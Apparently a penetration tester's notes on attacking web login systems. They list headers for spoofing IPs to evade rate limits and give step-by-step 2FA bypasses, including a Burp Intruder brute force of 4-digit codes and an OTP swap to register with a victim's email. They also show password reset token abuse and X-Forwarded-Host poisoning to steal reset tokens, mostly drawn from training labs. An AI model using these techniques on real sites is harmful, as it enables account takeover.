
Authentication is the process of verifying the identity of a user or client. Websites are potentially exposed to anyone who is connected to the internet.
- Something you know like password or security question or knowledge factors
- Something you have , physical object like mobile phone or security token. “Possession factors”
- Something you are. like biometric or pattern of behavior “inherence factors.”


##  Checklists :
- Enter valid username but an incorrect password login page error says like “only password is incorrect but username is not” or username is already taken when register new user in application.
- Username enumertion via error messages (used regex in burpsuite to negative search for name bases error. via different response like . there is slightly difference between correct and incorrect username in response)
- Username enumeration via response times(check if the username is valid , how much time it takes to process password for given length,if the username is incorrect what is the response time for incorrect user. )first check valid username timing than timing of the password if the username is correct
- Username enumeration via account lockout. brute force each user with 5 null password payload if there is any valid account it will response account lockout or something error message. Brute force password on based on given username. 
- you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached

list of all possilbe way to bypass rate limiting restriction with following headers:
```bash
X-Forwarded-For: 127.0.0.1        
# Trusted by proxies/load balancers
X-Real-IP: 127.0.0.1              
# Common in NGINX setups
X-Client-IP: 127.0.0.1            
# Used for rate limiting/tracking
X-Remote-IP: 127.0.0.1            
# May influence backend logic
X-Remote-Addr: 127.0.0.1          
# Tries to override remote IP
True-Client-IP: 127.0.0.1         
# Used by CDNs (e.g. Akamai)
CF-Connecting-IP: 127.0.0.1       
# Cloudflare real IP header
Fastly-Client-IP: 127.0.0.1       
# Fastly CDN client IP
X-Cluster-Client-IP: 127.0.0.1    
# Seen in clustered environments
Forwarded: for=127.0.0.1          
# RFC standard version of XFF
X-Originating-IP: 127.0.0.1       
# Used by mail servers & legacy apps
X-Forwarded-Host: 127.0.0.1       
# Can affect virtual host routing
X-Forwarded-Server: 127.0.0.1     
# Backend routing logic
X-Real-Hostname: localhost        
# Tries to spoof internal host
Via: 127.0.0.1                    
# May appear in proxy chains
Forwarded-For: 127.0.0.1          
# Non-standard but seen in wild
Proxy-Client-IP: 127.0.0.1        
# Java-based servers (Tomcat)
WL-Proxy-Client-IP: 127.0.0.1     
# WebLogic-specific heade
```

- If the request in json format we can use array of password in json format . so we can do multiple credential per request.

- IP address-based rate limiting
- Email-based rate limiting
- Device or Session-Based rate limiting
- Geo-Based rate limiting
- Endpoint-specific rate limiting, etc.

### Bypass 2FA
```bash
Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails.
Go to your account page and make a note of the URL.
Log out of your account.
Log in using the victim's credentials.
When prompted for the verification code, manually change the URL to navigate to /my-account. The lab is solved when the page loads




Go to the Sign-Up Page:
Visit the registration page at 👉 hxxps://website.com/signup/.
Enter Your Details:
Fill in the form with your email (e.g., myemail@gmail.com) and click the Sign Up button.
OTP Verification Page Appears:
A code will be sent to your email. Do not use this code! Instead, press the Back button.
Re-enter Details with Victim’s Email:
Go back to the Sign-Up page and fill in the form again, but this time use the victim’s email (e.g., victim@gmail.com).
Click Sign Up Again:
When prompted for the OTP, enter the code sent to your email (myemail@gmail.com).
Account Created Successfully:
The website accepts the code, and the account is successfully created using the victim’s email (victim@gmail.com).
```


### Using Burpsuite Advance feature 
```bash
With Burp running, log in as carlos and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. 

You need to use Burp's session handling features to log back in automatically before sending each request.
In Burp, click Settings to open the Settings dialog, then click Sessions. In the Session Handling Rules panel, click Add. The Session handling rule editor dialog opens.
In the dialog, go to the Scope tab. Under URL Scope, select the option Include all URLs.
Go back to the Details tab and under Rule Actions, click Add > Run a macro.

Under Select macro click Add to open the Macro Recorder. Select the following 3 requests:
GET /login
POST /login
GET /login2

Then click OK. The Macro Editor dialog opens.
Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.
Keep clicking OK to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.
Send the POST /login2 request to Burp Intruder.
In Burp Intruder, add a payload position to the mfa-code parameter.
In the Payloads side panel, select the Numbers payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.
Click on Resource pool to open the Resource pool side panel. Add the attack to a resource pool with the Maximum concurrent requests set to 1.
Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select Show response in browser. Copy the URL and load it in the browser.
Click My account to solve the lab.

```


### Testing for password reset vulnerability :

**Identify Password Reset Workflow**:

- Locate the "Forgot your password?" feature on the target website.
- Familiarize yourself with the expected behavior of the reset process.

Trigger a password reset request using your own account observer in burpsuite.

- The **reset token** provided (e.g., in a URL query parameter or request body).
- The email format and whether it includes sensitive information.

Analyze the Reset Token in the Email

- Identify the reset token in the URL (e.g., `temp-forgot-password-token`).
- Check:
    - **Token visibility**: Is the token exposed in the URL query parameter?
    - **Token entropy**: Is the token long and random (high entropy)?
    - **Token reuse**: Does the token expire after being used?

Reset Your Password

- Click the reset link in the email and reset your password to a new value.
- Capture the **POST request** in **Burp Proxy** when submitting the new password.
- Observe:
    - Whether the reset token is included in the request.
    - If other parameters (e.g., `username`) are present as hidden inputs.
    - Server response indicating a successful reset.

Test Token Validation on Password Submission

- Send the **POST password reset request** to **Burp Repeater**.
- Modify and test the request:
    - **Delete the reset token** from both the URL and request body.
    - Resubmit the request.
- Check:
    - Whether the password reset still succeeds.
    - If the server validates the token at this step.

Exploit the Lack of Token Validation

- Trigger another password reset request to generate a fresh token.
- Capture and send the **POST request** for resetting the password to **Burp Repeater**.
- Modify the following in the request:
    - **Delete the reset token** value.
    - **Change the username parameter** to another user (e.g., `carlos`).
    - Set a new password for the target user.
- Send the modified request and observe the response:
    - Does the server allow resetting another user's password?

Recommendations:

- Enforce token validation during all stages of the password reset workflow.
- Use high-entropy tokens with strict expiration policies.
- Avoid exposing sensitive parameters like `username` in hidden inputs.


### Password reset poisoning via middleware (token stealing):

Step by Step approach:

- Click on forget password functionality capture the request
- add the `X-Forwarded-Host` header with the URL of your exploit server. For example:

```makefile
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

- This forces the password reset link to be generated with the exploit server's URL instead of the legitimate domain.

- Visit your exploit server’s logs. Look for an entry similar to:
    
    ```bash
    bash
    Copy code
    GET /forgot-password?temp-forgot-password-token=VALID-TOKEN-FOR-CARLOS
    ```
    
- Extract the `temp-forgot-password-token` parameter value from the request.

**Modify the Reset Link**

- Obtain the password reset link from the victim's email (or the application UI).
    - Example link:
        ```perl
  
        https://target-website.com/reset?temp-forgot-password-token=ATTACKER-TOKEN
        ```
        
- Replace the `temp-forgot-password-token` value with the stolen token:
    
    ```perl
    perl
    Copy code
    https://target-website.com/reset?temp-forgot-password-token=VALID-TOKEN-FOR-CARLOS
    
    ```
    
- Replace our token with carlos token in actual real password reset link vulnerability.